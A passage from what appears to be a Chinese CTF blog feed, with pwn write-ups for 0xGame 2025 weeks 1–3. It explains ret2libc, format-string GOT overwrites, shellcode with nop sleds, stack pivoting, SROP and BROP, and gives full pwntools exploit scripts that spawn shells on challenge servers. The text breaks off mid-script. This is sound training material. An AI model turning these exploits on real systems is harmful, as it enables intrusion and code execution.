class="string">b&#x27;a&#x27;</span>*<span class="number">15</span></span><br><span class="line">pl1 = pl1.ljust(<span class="number">0x50</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(syscall_ret) + <span class="built_in">bytes</span>(s1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hello&gt; &#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.send(p64(<span class="number">0x401021</span>))</span><br><span class="line"></span><br><span class="line">s2 = SigreturnFrame()</span><br><span class="line">s2.rax = <span class="number">59</span></span><br><span class="line">s2.rdi = <span class="number">0x4027c8</span> <span class="comment">#gdb</span></span><br><span class="line">s2.rsi = <span class="number">0</span></span><br><span class="line">s2.rdx = <span class="number">0</span></span><br><span class="line">s2.rsp = <span class="number">0x402800</span></span><br><span class="line">s2.rip = syscall_ret</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">pl2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span> + <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">pl2 = pl2.ljust(<span class="number">0x50</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(syscall_ret) + <span class="built_in">bytes</span>(s2) </span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>解释一下exp。这里的s1是去构造了read函数，将我们后面发送的0x401021入读到0x402800的位置，然后rip处设置的是syscall_ret指令，ret就会把栈顶的值pop给rip，所以就会返回sub_401021函数了，继续执行下面的程序。pl1先填入a*15，是通过write函数中有类似strlen的功能，可以控制字符串长度，从而将rax的值设置为0xf来调用sigreturn。后面就会执行我们构造的read函数。</p>
<p>s2是去构造了execve函数，这里的rdi设置的是存放着&#x2F;bin&#x2F;sh的地址，可以通过gdb动调出来。</p>
<p><img src="/images/24week2.8-2.png" alt="gdb"></p>
<p>这里可以看出我们写入的&#x2F;bin&#x2F;sh的地址，然后将rdi的值控制为binsh的地址就可以了。</p>
]]></content>
      <categories>
        <category>stack</category>
      </categories>
      <tags>
        <tag>pwn入门</tag>
      </tags>
  </entry>
  <entry>
    <title>2025 0xGame Week2 Pwn</title>
    <url>/2025/11/12/2025-0xGame-Week2-Pwn/</url>
    <content><![CDATA[<h1 id="0xGame-Week2-Pwn"><a href="#0xGame-Week2-Pwn" class="headerlink" title="0xGame Week2 Pwn"></a>0xGame Week2 Pwn</h1><h2 id="1-Ret2libc"><a href="#1-Ret2libc" class="headerlink" title="1.Ret2libc"></a>1.Ret2libc</h2><p>像这样类似的题，关键是确定libc.so.6的版本，然后泄露出libc_base的地址。因为这样可以确定system的地址和&#x2F;bin&#x2F;sh的地址，从而实现getshell。</p>
<p><img src="/images/week2-1(1).png" alt="ida"></p>
<p>由vuln可以看出read存在溢出点。</p>
<p><img src="/images/week2-1(2).png" alt="exp"></p>
<p>解读一下exp，这边pl1通过栈溢出，覆盖至ret，因为ret指令实际上相当于pop rip，即将rsp处的值弹给rip去执行。所以这里将ret地址返回为puts_plt，也就是会执行一个puts函数，同时rdi中存储着puts的真实地址，由puts_got表跳转得到。再减去由libc.so.6版本控制的offset，就可以获得libc_base的地址。然后就是正常的rop链攻击。</p>
<h2 id="2-格式化字符串"><a href="#2-格式化字符串" class="headerlink" title="2.格式化字符串"></a>2.格式化字符串</h2><p>将附件丢进ida静态分析</p>
<p><img src="/images/week2-2(1).png" alt="ida"></p>
<p>可以看出这里有两次read和printf函数，并且每次都会将我们输入的数据输出。由于第一个read函数规定读取数据大小只有0x60，所以这里不存在溢出点。但是可以通过第一个read来泄露一些我们需要的数据，如canary和libc_base的地址。·第二个read存在栈溢出，是我们构造payload的重点。</p>
<p><img src="/images/week2-2(2).png" alt="exp"></p>
<p>这里来解释一下exp，通过数据测试，可以得到我们填入的数据应该在栈上第六个位置。从上往下找，看到末尾字节为00的就是canary的地址。（特性）</p>
<p><img src="/images/week2-2(3).png" alt="gdb"></p>
<p><img src="/images/week2-2(4).png" alt="gdb"></p>
<p>在栈上距离我们输入的aaaa（测试数据）为0x0d-0x00+6(寄存器)&#x3D;19，同时此时rcx处放的是read+18的地址。所以libc_base &#x3D; rcx内存的地址 - libc.symbols[‘read’] - 18。可以检验libc_base的末三位是否为000。如果是的，那么恭喜得到了正确的libc_base。然后就是进行对printf_got的改写，改写为system_addr。</p>
<p>板子为：fmtstr_payload(6,{printf_got:system_addr})。一定要context.arch&#x3D;”amd64&#x2F;i386”。不过本题似乎仅仅使用板子不行。因为此处板子长度为0x78，会将canary的地址覆盖，导致段错误。（刻意去用板子其实也可以成功，但还是推荐手写）</p>
<p>那怎么改写呢？由于libc_base+sysmbols[‘ ‘]，所以导致了system与printf其实仅仅有后三位字节不同也就是说只要改写后三位字节即可。</p>
<p><img src="/images/week2-2(5).png"></p>
<p>由于单次写入长度过大，可能导致不稳定，所以选择单字节或双字节写入。之后的就可以看exp。</p>
<p>最后pl2为什么要填充到0x30呢？因为我改写的地址是12，13，对应栈上的位置应该是06，07，而此时距离rsp的距离就是0x30（不断向栈上填入数据，会将rsp”抬高”）。</p>
<p><img src="/images/week2-2(6).png" alt="gdb"></p>
<h2 id="3-植物大战僵尸"><a href="#3-植物大战僵尸" class="headerlink" title="3.植物大战僵尸"></a>3.植物大战僵尸</h2><p>进ida分析，可以看出是多线程问题，而且未上锁，且存在1s的延迟。</p>
<p><img src="/images/week2-3(1).png" alt="ida"></p>
<p><img src="/images/week2-3(2).png" alt="ida"></p>
<p><img src="/images/week2-3(3).png" alt="ida"></p>
<p>可以看出，这里的root函数存在后门。来一下实现条件，是trophy!&#x3D;0就可以了。所以可以通过在短时间内大量创建用户，将数组填满，就可以改变trophy的值为非0。下面是exp。</p>
<p><img src="/images/week2-3(4).png" alt="exp"></p>
<h2 id="4-任意代码执行"><a href="#4-任意代码执行" class="headerlink" title="4.任意代码执行"></a>4.任意代码执行</h2><p><img src="/images/week2-4(1).png" alt="ida"></p>
<p>这里是通过构造shellcode读取到bss段进行恶意代码执行。可以看出这里如果我们输入的字节数大于3就会直接退出程序。所以我们需要绕过strlen检测。那么strlen是如何截断的呢？是通过读取’\x00’的前的字节数来返回字节数值。于是我们可以通过构造’\x00’+shellcode来绕过。这道题还有个小坑。如果用板子asm(shellcraft.sh())去进行shellcode构造的话，这道题是做不出来的。因为这里的read读取长度限制为0xa，也就是只有10个字节，是远远小于我们用板子直接构造出来的shellcode的。所以我们需要先构造一个可以读取足够长度的read函数，再来调用，从而读入我们需要的shellcode。</p>
<p><img src="/images/week2-4(2).png" alt="exp"></p>
<p>这边来说一下手动构造。</p>
<p><img src="/images/week2-4(3).png" alt="gdb"></p>
<p>想要构造read函数，就要先控制read传参的寄存器。即rdi–fd，rsi–buf，rdx–len。在gdb调试中，可以看出，rdi&#x3D;0，而我们仍然进行了xor rdi,rdi（保险起见），就是为了让rdi&#x3D;0。rsi此时指向的地址就是bss段，所以不需要进行修改。而我们需要一个较长的读取长度。可以看到这里的r11存放着0x246就已经够了，所以用mov rdx,r11就可以将把r11中的值给rdx，至此一个读取较长长度的read函数就构造好了。最后又用到了一个nop sled的技巧，通过填充大量的nop来使执行自己的恶意代码的概率提高。</p>
]]></content>
      <categories>
        <category>stack</category>
      </categories>
      <tags>
        <tag>pwn入门</tag>
      </tags>
  </entry>
  <entry>
    <title>2025 0xGame Week1 Pwn</title>
    <url>/2025/11/11/2025-0xGame-Week1-Pwn/</url>
    <content><![CDATA[<h1 id="0xGame-Week1-Pwn"><a href="#0xGame-Week1-Pwn" class="headerlink" title="0xGame Week1 Pwn"></a>0xGame Week1 Pwn</h1><h2 id="1-Test-your-nc"><a href="#1-Test-your-nc" class="headerlink" title="1.Test your nc"></a>1.Test your nc</h2><p>简单的签到题，熟知nc的用法即可。</p>
<p><img src="/images/week1-1(1).png" alt="图解"></p>
<h2 id="2-命令执行"><a href="#2-命令执行" class="headerlink" title="2.命令执行"></a>2.命令执行</h2><p>同样远端连接后，可以直接获取shell，不过过滤了cat和sh指令。通过拼接就可以成功获得flag。</p>
<p><img src="/images/week1-2(1).png" alt="图解"></p>
<h2 id="3-Stack-overflow"><a href="#3-Stack-overflow" class="headerlink" title="3.Stack overflow"></a>3.Stack overflow</h2><p>栈溢出。先丢进ida查看，发现backdoor，却是假的，但是whhhat给出了shell。再看main函数，看到了read危险函数，并且存在溢出的机会。</p>
<p><img src="/images/week1-3(1).png" alt="ida"></p>
<p><img src="/images/week1-3(2).png" alt="exp"></p>
<p>简单说一下exp，首先是对pwn工具库的一个调用，之后是对远端的连接，如果是在虚拟机上连接远端环境用remote，如果在物理机上则用connect，调试也可以用process指令。观察ida可以看出距离rbp为0x30又有0x8（64位下）的大小存放rbp，所以距离ret_addr实际上是0x38的大小，所以填充0x38的padding来使函数返回至后门函数，也就是shell的地址（在ida中找出，这里不做演示）。最后getshell。</p>
<p><img src="/images/week1-3(3).png" alt="图解"></p>
<h2 id="4-ROP1"><a href="#4-ROP1" class="headerlink" title="4.ROP1"></a>4.ROP1</h2><p>rop链是pwn的一种常见攻击手段，可以上网看看原理。把附件丢进ida中</p>
<p><img src="/images/week1-4(1).png" alt="ida"></p>
<p>可以看到有gadget函数，可以在ida中查看gadget的地址为0x40117E，也可以在bash中用指令（ROPgadget –binary “文件名” –only “pop|ret” | grep “rdi”）获得地址。</p>
<p><img src="/images/week1-4(4).png" alt="rdi"></p>
<p>由于在ida中找不到sh相关的字符串，于是可以从gdb中获取（当然选择在help中用偏移也是可以打通的）</p>
<p><img src="/images/week1-4(2).png" alt="sh"></p>
<p>从而可以构造exp</p>
<p><img src="/images/week1-4(3).png" alt="exp"></p>
<h5 id="由于ubuntu的版本，所以这里需要进行栈对齐，也就是payload中p64-ret-的由来。"><a href="#由于ubuntu的版本，所以这里需要进行栈对齐，也就是payload中p64-ret-的由来。" class="headerlink" title="由于ubuntu的版本，所以这里需要进行栈对齐，也就是payload中p64(ret)的由来。"></a>由于ubuntu的版本，所以这里需要进行栈对齐，也就是payload中p64(ret)的由来。</h5><p>这里的ret是任意的一个ret_addr，因为其大小为1，所以可以起到一个对齐的作用。（因为我也不完全清楚其背后的原理QAQ）</p>
<h2 id="5-ROP2"><a href="#5-ROP2" class="headerlink" title="5.ROP2"></a>5.ROP2</h2><p>这道题的解法其实和上一道rop1类似，不过由于过滤掉了sh，bash等sh类指令，所以这边可以联想到$0这个神奇的参数也可以起到一个shell的作用。</p>
<p><img src="/images/week1-5(1).png" alt="$0"></p>
<p>exp如下图</p>
<p><img src="/images/week1-5(2).png" alt="exp"></p>
<p>week1至此结束，至于还有一道简单数学题，对python语法要求较高，我就不在此叙述。（绝对不是我菜QWQ）</p>
]]></content>
      <categories>
        <category>stack</category>
      </categories>
      <tags>
        <tag>pwn入门</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-0xGame-Week3-Pwn</title>
    <url>/2026/01/05/2025-0xGame-Week3-Pwn/</url>
    <content><![CDATA[<h1 id="0xGame-Week3-Pwn"><a href="#0xGame-Week3-Pwn" class="headerlink" title="0xGame-Week3-Pwn"></a>0xGame-Week3-Pwn</h1><h2 id="1-Ret2shellcode"><a href="#1-Ret2shellcode" class="headerlink" title="1.Ret2shellcode"></a>1.Ret2shellcode</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> random_number; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;have a good time&quot;</span>);</span><br><span class="line">  mprotect((<span class="type">void</span> *)((<span class="type">unsigned</span> __int64)&amp;buf &amp; <span class="number">0xFFFFFFFFFFFFF000L</span>L), <span class="number">0x1000u</span>LL, <span class="number">7</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100u</span>LL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">256</span>; ++i )</span><br><span class="line">    ;</span><br><span class="line">  random_number = get_random_number();</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))((<span class="type">char</span> *)&amp;buf + random_number % <span class="number">80</span> + <span class="number">80</span>))();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在Linux系统中，<code>mprotect</code>函数用于修改指定内存区域的保护属性。</p>
<p>所以这里我们可以看出，给 buf区，0x1000长度，7的权限，也就是rwx权限。所以我们这里可以往buf里读入shellcode从而getshell。不过这里由于最后调用函数的位置是buf+random_number%80+80，所以offset在80-159。由于我们可以读入0x100的数据，所以不管具体在哪里执行，我们都可以填入大量的nop，来使击中我们shellcode的概率大大增加。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">42606</span>)</span><br><span class="line"></span><br><span class="line">pl = asm(shellcraft.sh()).rjust(<span class="number">0x100</span>,<span class="string">b&#x27;\x90&#x27;</span>) <span class="comment">#nop</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;have a good time&#x27;</span>)</span><br><span class="line">io.send(pl)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="2-栈迁移"><a href="#2-栈迁移" class="headerlink" title="2.栈迁移"></a>2.栈迁移</h2><p>丢进ida发现就只有一个vuln函数里给了read函数的栈溢出。而且溢出大小只有0x10。所以我们需要通过栈迁移来获取较大的空间，来构造我们的rop。</p>
<p>下面先给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">38325</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">vuln = elf.symbols[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">rdi = <span class="number">0x4011c5</span></span><br><span class="line">ret = <span class="number">0x4011f4</span></span><br><span class="line">bss = <span class="number">0x404070</span> + <span class="number">0x500</span> <span class="comment">#rsp</span></span><br><span class="line">pop_rbp = <span class="number">0x40115d</span></span><br><span class="line">offset = <span class="number">0x100</span></span><br><span class="line">read = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">leave = <span class="number">0x4011f3</span></span><br><span class="line"><span class="comment">#---&gt; bss</span></span><br><span class="line">pl1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x100</span> + p64(bss+offset) + p64(<span class="number">0x4011d9</span>) <span class="comment">#lea</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27; :)&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl1)</span><br><span class="line">pl2 = p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rbp) + p64(bss+<span class="number">0x300</span>+offset) + p64(<span class="number">0x4011d9</span>)</span><br><span class="line">pl2 = pl2.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(bss-<span class="number">8</span>) + p64(leave) </span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl2)</span><br><span class="line">base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - libc.sym.puts</span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line">binsh = base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">sys = base + libc.sym.system</span><br><span class="line">pl3 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(rdi) + p64(binsh) + p64(ret) + p64(sys)</span><br><span class="line">pl3 = pl3.ljust(offset,<span class="string">b&#x27;\x00&#x27;</span>) + p64(bss+<span class="number">0x300</span>) + p64(leave)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这里bss加上0x500是为了放置写入的数据破坏了bss段本身就有的数据，导致程序报错。</p>
<p>想要了解栈迁移前，我们需要了解leave和ret。</p>
<p>leave其实可以理解为mov rsp,rbp;pop rbp，而ret可以理解为pop rip。所以bss+offset会被弹为新的rbp地址，然后返回0x4011d9处去执行。</p>
<p>看到pl1这里是bss+0x100，为什么呢？因为这里bss+0x100实际上是先去定下了rbp的地址，后面再次调用read的时候，去开辟空间是根据rbp来寻址，也就是说会减掉0x100的字节大小。所以最后我们的bss就定下了rsp的地址。后面的0x4011d9我们来看一下这里具体干了什么。</p>
<p><img src="/images/week3-2(1).png" alt="ida"></p>
<p>可以看出来，这里就是我们说的根据rbp来开辟read的读入空间。也就是说，此时我们将rbp的地址改为bss段上某一处的地址，然后读入的缓冲区也跟着到了bss段了。</p>
<p>接着就是新的一轮read，我们来看看我们往bss段上写入了什么。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pl2 = p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rbp) + p64(bss+<span class="number">0x300</span>+offset) + p64(<span class="number">0x4011d9</span>)</span><br><span class="line">pl2 = pl2.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(bss-<span class="number">8</span>) + p64(leave) </span><br></pre></td></tr></table></figure>

<p>可以看出，我们是想要泄露libc_base的地址。然后我们在bss段上构造了一个假的leak后面的pop_rbp相当于leave;ret指令，是为了二次读入shellcode，同时再将rbp的地址迁移到更高的位置。后面又读入一次，就是和ret2libc类似的打法。关键这里需要看懂各个栈的位置。由于rsp会在进程中自增8，可以通过gdb看出，所以后面我们leave处写入的地址是bss-8，然后rsp处又会弹到bss段，正好布置到我们pop_rdi的地方，然后泄露libc_base。</p>
<p>pl3处写一个b’a’*8是因为我们最后有一个leave。所以会pop rip也就是将栈顶的内容弹出。那么如果是不填充padding的话，就会导致我们的pop_rdi的指令被pop 到rip里，此时我们构造的rop就被破坏了。所以需要给rbp一个值。需要配合gdb逐步调试。</p>
<h2 id="3-FMT？"><a href="#3-FMT？" class="headerlink" title="3.FMT？"></a>3.FMT？</h2><p>这次我们输入的内容不在栈上了，我们又该怎么利用任意地址读和写呢？</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I know you can rce from fmt&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;But without stack,how can you change val?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, bss, <span class="number">0x200u</span>LL);</span><br><span class="line">    <span class="built_in">printf</span>(bss);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到我们读入的地址都在bss段。我们进gdb调试可以看到</p>
<p><img src="/images/week3-3(1).png" alt="gdb"></p>
<p>可以看出来这有多级指针可以指向main的地址，那么我们又知道printf_got表的地址和main函数相差不是很大，所以可以通过改写main为printf_got的地址，再将printf的真实地址改写为system的地址，就可以在我们读入shell时成功getsehll了。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level =  &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;nc1.ctfplus.cn&#x27;,45337)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;val?&#x27;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;val?&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;aa%7$pbb%11$p&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x29d90</span></span><br><span class="line">success(<span class="string">f&#x27;base---&gt;&#x27;</span>+<span class="built_in">hex</span>(base))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;bb&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">f&#x27;stack---&gt;&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">sys = base + libc.sym.system</span><br><span class="line">success(<span class="built_in">hex</span>(sys))</span><br><span class="line">stack1 = stack - <span class="number">0x100</span></span><br><span class="line">stack2 = stack - <span class="number">0xd0</span></span><br><span class="line">success(<span class="string">f&#x27;stack1---&gt;&#x27;</span>+<span class="built_in">hex</span>(stack1))  <span class="comment">#de88</span></span><br><span class="line">success(<span class="string">f&#x27;stack2---&gt;&#x27;</span>+<span class="built_in">hex</span>(stack2))  <span class="comment">#deb8</span></span><br><span class="line">pl1 = <span class="string">f&#x27;%<span class="subst">&#123;stack1&amp;<span class="number">0xffff</span>&#125;</span>c%11$hn&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">sd(pl1)</span><br><span class="line">got = <span class="number">0x4028</span></span><br><span class="line">pl2 = <span class="string">f&#x27;%<span class="subst">&#123;got&#125;</span>c%41$hn&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">sd(pl2)</span><br><span class="line">high = (sys&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line">low = sys&amp;<span class="number">0xffff</span></span><br><span class="line">success(<span class="string">f&#x27;high---&gt;&#x27;</span>+<span class="built_in">hex</span>(high))</span><br><span class="line">success(<span class="string">f&#x27;low---&gt;&#x27;</span>+<span class="built_in">hex</span>(low))</span><br><span class="line"></span><br><span class="line">pl3 = <span class="string">f&#x27;%<span class="subst">&#123;stack2&amp;<span class="number">0xffff</span>&#125;</span>c%11$hn&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">sd(pl3)</span><br><span class="line">pl4 = <span class="string">f&#x27;%<span class="subst">&#123;got+<span class="number">2</span>&#125;</span>c%41$hn&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">sd(pl4)</span><br><span class="line">pl5 = <span class="string">f&#x27;%<span class="subst">&#123;high&#125;</span>c%15$hhn&#x27;</span></span><br><span class="line">pl5 += <span class="string">f&#x27;%<span class="subst">&#123;low-high&#125;</span>c%9$hn&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">sd(pl5)</span><br><span class="line">sd(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>pl1的作用是将偏移为11处的地址指向main，然后pl2是改为printf_got表地址。看看效果</p>
<p><img src="/images/week3-3(2).png" alt="gdb"></p>
<p>可以看到后面直接给出了printf的真实地址。由于单次改写字节不能太大，一般建议1-2字节改入，而比较可以system和printf的真实地址差三字节。所以我们要通过两次改写，也就是pl5的作用。由于同一处地址不能进行两处改写，所以我们这里又去找了另一个指向main的地址，重新经行上面的工作。不过由于我们第一次是改写的末二位字节，所以将got的地址+2就可以改写第末三字节。</p>
<p>由于末二位字节写入的长度大于第末三位。所以我们这里采用先写入第末三位字节，再写入末二位字节。</p>
<h2 id="4-SROP"><a href="#4-SROP" class="headerlink" title="4.SROP"></a>4.SROP</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  vuln();</span><br><span class="line">  v0 = sys_exit(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sys_write(<span class="number">1u</span>, buf, sys_read(<span class="number">0</span>, buf, <span class="number">0x300u</span>LL));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序很简单，就给了write和exit的系统调用，再结合题干所述，可以知道这里要用srop的技巧。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;nc1.ctfplus.cn&#x27;,43153)</span></span><br><span class="line">sh = <span class="number">0x40105a</span></span><br><span class="line">syscall_ret = <span class="number">0x40100f</span></span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.rax = <span class="number">0x3b</span></span><br><span class="line">sig.rdi = sh</span><br><span class="line">sig.rsi = <span class="number">0</span></span><br><span class="line">sig.rdx = <span class="number">0</span></span><br><span class="line">sig.rip = syscall_ret</span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span> + p64(<span class="number">0x401012</span>) + <span class="string">b&#x27;\0&#x27;</span>*<span class="number">8</span> + p64(syscall_ret) + <span class="built_in">bytes</span>(sig)</span><br><span class="line"><span class="comment">#pl = b&#x27;a&#x27;*0x108 + p64(0x401012) + p64(syscall_ret) + bytes(sig)</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(pl)</span><br><span class="line">io.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/images/week3-4(1).png" alt="gdb"></p>
<p>我们可以看出elf0x40105a处放着&#x2F;bin&#x2F;sh，所以我们只需要去构造execve然后控制rdi处放着sh就好了。这里又多填充了8个字节是因为再次读完栈上的padding后，发现此时距离rbp的距离发生了改变，正好少了8个字节所以补入，而且这对第一次没有影响。</p>
<h2 id="5-BROP"><a href="#5-BROP" class="headerlink" title="5.BROP"></a>5.BROP</h2><p>Blind Rop。对远端nc，多试几次，可以发现这里存在fmt漏洞，并且偏移量是6。</p>
<p>然后结合题干给的信息来看，可以看出pie是关的，并且只要我们能接收到整个程序，我们就能get flag。</p>
<p><img src="/images/week3-5(1).png"></p>
<p>所以我们可以用%n$s来接收远端的数据，然后获取整个elf的数据。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">23333</span>)</span><br><span class="line"></span><br><span class="line">begin = <span class="number">0x400000</span></span><br><span class="line"><span class="built_in">bin</span> = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">    pl = <span class="string">b&#x27;%7$sdump&#x27;</span> + p64(addr)</span><br><span class="line">    io.sendline(pl)</span><br><span class="line">    data = io.recvuntil(<span class="string">&#x27;dump&#x27;</span>)[:-<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span 